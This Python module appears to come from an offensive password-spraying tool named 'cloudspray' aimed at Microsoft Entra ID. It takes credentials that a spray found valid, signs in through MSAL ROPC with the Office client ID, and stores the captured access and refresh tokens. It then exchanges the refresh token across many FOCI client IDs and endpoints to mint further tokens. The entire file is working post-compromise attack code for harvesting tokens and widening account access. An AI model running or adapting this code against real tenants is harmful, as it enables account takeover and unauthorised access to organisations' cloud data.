import logging
from datetime import datetime, timedelta, timezone

import msal

from cloudspray.constants import ENDPOINTS, FOCI_CLIENT_IDS, AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.state.db import StateDB
from cloudspray.state.models import Token

logger = logging.getLogger(__name__)

# Office client ID used for initial ROPC token capture (FOCI member)
OFFICE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"


class TokenManager:
    """Manages captured tokens and performs FOCI refresh token exchange.

    When spray gets SUCCESS, tokens are captured. FOCI (Family of Client IDs)
    allows exchanging a refresh token obtained with one client ID for tokens
    targeting other FOCI-member applications.
    """

    def __init__(self, domain: str, db: StateDB, reporter: ConsoleReporter):
        self._domain = domain
        self._authority = f"https://login.microsoftonline.com/{domain}"
        self._db = db
        self._reporter = reporter

    def capture_tokens(self, username: str, password: str) -> Token | None:
        """Authenticate and capture full token set (access, refresh, id tokens).

        Uses MSAL ROPC with the Office client ID (FOCI member) to get initial tokens.
        Stores tokens in the state DB.
        Returns the Token object or None on failure.
        """
        app = msal.PublicClientApplication(
            OFFICE_CLIENT_ID,
            authority=self._authority,
        )

        graph_scope = ["https://graph.microsoft.com/.default"]

        try:
            result = app.acquire_token_by_username_password(
                username, password, scopes=graph_scope
            )
        except Exception as exc:
            self._reporter.error(f"Token capture failed for {username}: {exc}")
            logger.exception("Token capture exception for %s", username)
            return None

        if not result or "access_token" not in result:
            error_desc = result.get("error_description", "Unknown error") if result else "No response"
            self._reporter.debug(f"Token capture failed for {username}: {error_desc}")
            return None

        token = self._build_token(result, username, OFFICE_CLIENT_ID, "https://graph.microsoft.com")
        self._db.store_token(token)
        self._reporter.info(f"Captured tokens for {username}")
        return token

    def foci_exchange(self, refresh_token: str, username: str) -> list[Token]:
        """Exchange a FOCI refresh token for tokens across all FOCI applications.

        Iterates through FOCI_CLIENT_IDS combined with ENDPOINTS, using MSAL's
        acquire_token_by_refresh_token() to mint new tokens for each app.

        Returns list of successfully minted Token objects.
        All tokens are stored in the DB.
        """
        minted_tokens: list[Token] = []
        tenant_slug = self._domain.split(".")[0]

        seen_client_ids: set[str] = set()
        for client_name, client_id in FOCI_CLIENT_IDS.items():
            if client_id in seen_client_ids:
                continue
            seen_client_ids.add(client_id)
            for endpoint_name, endpoint_url in ENDPOINTS.items():
                resource_url = endpoint_url.replace("{tenant}", tenant_slug)
                scope = [f"{resource_url}/.default"]

                app = msal.PublicClientApplication(
                    client_id,
                    authority=self._authority,
                )

                try:
                    result = app.acquire_token_by_refresh_token(
                        refresh_token, scopes=scope
                    )
                except Exception as exc:
                    logger.debug(
                        "FOCI exchange failed: client=%s endpoint=%s error=%s",
                        client_name, endpoint_name, exc,
                    )
                    continue

                if not result or "access_token" not in result:
                    continue

                token = self._build_token(result, username, client_id, resource_url, is_foci=True)
                self._db.store_token(token)
                minted_tokens.append(token)

                self._reporter.debug(
                    f"FOCI exchange success: {client_name} -> {endpoint_name}"
                )

                # Update refresh token for subsequent exchanges (may have rotated)
                if "refresh_token" in result:
                    refresh_token = result["refresh_token"]

        self._reporter.info(
            f"FOCI exchange for {username}: {len(minted_tokens)} tokens minted"
        )
        return minted_tokens

    def exchange_all_valid_credentials(self) -> dict[str, list[Token]]:
        """For each valid credential in the DB with SUCCESS result,
        capture tokens and perform FOCI exchange.

        Returns dict mapping username to list of all tokens obtained.
        """
        valid_creds = self._db.get_valid_credentials()
        success_creds = [
            cred for cred in valid_creds
            if cred.result == AuthResult.SUCCESS
        ]

        if not success_creds:
            self._reporter.info("No SUCCESS credentials found for token exchange")
            return {}

        results: dict[str, list[Token]] = {}
        self._reporter.info(
            f"Starting token capture and FOCI exchange for {len(success_creds)} credential(s)"
        )

        for cred in success_creds:
            user_tokens: list[Token] = []

            initial_token = self.capture_tokens(cred.username, cred.password)
            if not initial_token:
                self._reporter.error(f"Could not capture initial token for {cred.username}")
                results[cred.username] = []
                continue

            user_tokens.append(initial_token)

            if initial_token.refresh_token:
                foci_tokens = self.foci_exchange(
                    initial_token.refresh_token, cred.username
                )
                user_tokens.extend(foci_tokens)

            results[cred.username] = user_tokens

        return results

    def _build_token(
        self,
        msal_result: dict,
        username: str,
        client_id: str,
        resource: str,
        is_foci: bool = False,
    ) -> Token:
        """Build a Token dataclass from an MSAL result dict."""
        expires_in = msal_result.get("expires_in", 3600)
        if isinstance(expires_in, int):
            expires_at = datetime.now(timezone.utc) + timedelta(seconds=expires_in)
        else:
            expires_at = datetime.now(timezone.utc) + timedelta(seconds=3600)

        return Token(
            username=username,
            access_token=msal_result.get("access_token", ""),
            refresh_token=msal_result.get("refresh_token", ""),
            id_token=msal_result.get("id_token", ""),
            client_id=client_id,
            resource=resource,
            expires_at=expires_at,
            is_foci=is_foci,
        )
